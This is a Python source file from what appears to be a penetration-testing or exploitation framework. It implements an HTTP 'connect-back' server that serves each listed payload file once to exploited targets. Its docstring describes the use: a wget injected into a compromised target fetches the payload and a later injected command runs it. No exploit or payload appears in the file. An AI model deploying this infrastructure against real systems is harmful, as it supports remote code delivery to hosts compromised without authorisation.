# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 


import sys
import signal
import os
import urlparse
import time
import traceback
import errno
from BaseHTTPServer import HTTPServer,BaseHTTPRequestHandler

from ..servers import ServerException
from ..common.support import Logging


class HTTPConnectbackServer(object):
    """
    An HTTP Connect-back server class.
    
    This class provides a server that waits for an incoming HTTP GET from an
    exploited target in order to serve up a requested payload to the target.
    The server will serve up each file in the provided list of files one time,
    then terminate.
    
    This class is useful for targets that have been exploited via command
    injection.  For example, a wget command maybe executed on the target to
    retrieve a payload, and a subsequent command injection is used to execute
    the payload.  In the case that multiple targets will be exploited, each
    requiring a customized payload, this HTTP server keeps track of which
    payloads have been served so that it may terminate once all have been
    served.
    """
    def __init__(self,connectback_ip,files_to_serve,port=8080,docroot=None,logger=None):
        """
        Class constructor.
        
        Parameters
        ----------
        connectback_ip: The address this server should bind to.
        files_to_serve: A list of files to serve up to the target.  Each file
            is served exactly once.  To serve a file more than once, include it
            in the list more than once.  Once all files have been served, 
            the server terminates.
        port: Optional. The port this server should bind to. Default value is
              8080.
        logger: Optional.  Logger object to send log output to. If none is
            provided, a logger will be instantiated with output to stdout.
        """
        if not logger:
            logger=Logging()
        self.logger=logger
        self.server_address=(connectback_ip,port)
        self.files_to_serve=files_to_serve
        if not docroot:
            self.docroot=os.getcwd()
        else:
            self.docroot=docroot
            
        self.docroot=self.docroot+"/"
        
        problems=self._sanity_check_files(files_to_serve)
        if len(problems) > 0:
            msg="There were problems with the following files:"
            for file,e in problems.items():
                msg +="\n\t%s: %s" % (file,str(e))
            raise ServerException(msg)
        
        
    def _sanity_check_files(self,files):
        problems={}
        root=self.docroot
        for file in files:
            try:
                open(root+file,"r")
            except Exception as e:
                problems[file]=e

        return problems

    
    def _exit(self):
        #this prevents a hang in mod_wsgi, which traps sys.exit()
        try:
            os.execv("/bin/true",["/bin/true"])
        except:
            sys.exit()
    
    def _handler(self,signum,frame):
        if self.keepgoing:
            self.keepgoing=False
            raise ServerException()

    def _setup_signals(self):
        self.keepgoing=True
        signal.signal(signal.SIGINT,self._handler)
        signal.signal(signal.SIGTERM,self._handler)

    def _serve_files(self):
        while self.keepgoing and self.httpd.more_files():
            try:
                self.httpd.handle_request()
            except:
                self.logger.LOG_INFO("[%d] http server caught an exception." % os.getpid())
                #traceback.print_exc()
                self.keepgoing=False

    
    def wait(self):
        """
        Wait for the server to shut down.  The server will terminate when it has
        served each file in the list provided to the constructor exactly once.
        """
        if not self.pid:
            return None
        self._setup_signals()
        keepgoing=True
        status=(0,0)
        while keepgoing:
            try:
                status=os.waitpid(self.pid,0)
            except Exception as e:
                keepgoing=False
        self.pid=None
        
        return status[1]
    
    def shutdown(self):
        """
        Shut down the server.
        
        This should only be necessary if the server has not finished serving
        the list of files (e.g., the remote exploit has failed).
        
        In the event the server has served all the files in the list provided to
        the constructor, it will terminate on its own.
        """
        if not self.pid:
            return
        self.logger.LOG_INFO("[%d] Shutting down server. PID: %d" % (os.getpid(),self.pid))
        #traceback.print_stack()
        try:
            os.kill(self.pid,signal.SIGTERM)
        except OSError as ose:
            if ose.errno == errno.ESRCH:
                return
            else:
                self.logger.LOG_WARN("Error shutting down server: %s" % str(ose))
                raise
        
    def serve(self):
        """
        Serve a list of one or more files.
        
        This function returns the child PID. The child exits without
        returning.
        
        Parameters: None.
        """
        try:
            self.httpd=_LimitedHTTPServer(self.server_address,
                                         _LimitedHTTPRequestHandler,
                                         files_to_serve=self.files_to_serve,
                                         docroot=self.docroot)
        except Exception as e:
            self.logger.LOG_WARN("There was an error creating the HTTP server: %s" % str(e))
            raise
        self.pid=os.fork()
        if self.pid:
            self.httpd.socket.close()
            self.httpd=None
            return self.pid
        else:
            self._setup_signals()
            self._serve_files()
        
        self.logger.LOG_INFO("[%d] Shutting down." % os.getpid())
        
        self.httpd.socket.close()
        self.httpd=None
        self._exit()
        


class _LimitedHTTPServer(HTTPServer):
    def __init__(self,server_address,handler_class,docroot=None,files_to_serve=[],logger=None):
        if not logger:
            logger=Logging()
        self.logger=logger
        
        self.docroot=docroot
        if not docroot:
            self.docroot=os.getcwd()
        self.files_to_serve=[]
        for filename in files_to_serve:
            if not filename.startswith("/"):
                filename="/"+filename
                filename=self._sanitize_filename(filename)
            filename=self.docroot+filename
            self.files_to_serve.append(filename)

        HTTPServer.__init__(self,server_address,handler_class)
    
    def _sanitize_filename(self,filename):
        while '/../' in filename:
            filename=filename.replace('/../','/')
        
        return filename
    
    def has_file(self,filename):
        logger=self.logger
        if filename in self.files_to_serve:
            return True
        return False

    def more_files(self):
        if len(self.files_to_serve) > 0:
            return True
        return False

    def remove_file(self,filename):
        if self.has_file(filename):
            self.files_to_serve.remove(filename)

class _LimitedHTTPRequestHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        self.server.logger.LOG_DEBUG(fmt % (args))

    def do_GET(self):
        if self.server.logger:
            logger=self.server.logger
        else:
            logger=Logging()
        filename=self.server.docroot+self.path


        file_exists=False
        if self.server.has_file(filename):
            file_exists=True
            self.server.remove_file(filename)
            try:
                f=open(filename)
                self.send_response(200)
                self.send_header('Content-type','application/octet-stream')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
            except Exception as e:
                logger.LOG_WARN("Error serving file: %s" % self.path)
                logger.LOG_WARN("%s" % str(e))
                file_exists=False
        else:
            logger.LOG_WARN("Server doesn't have file: %s" % self.path)


        if not file_exists:
            self.send_error(404,'File Not found: %s' % self.path)




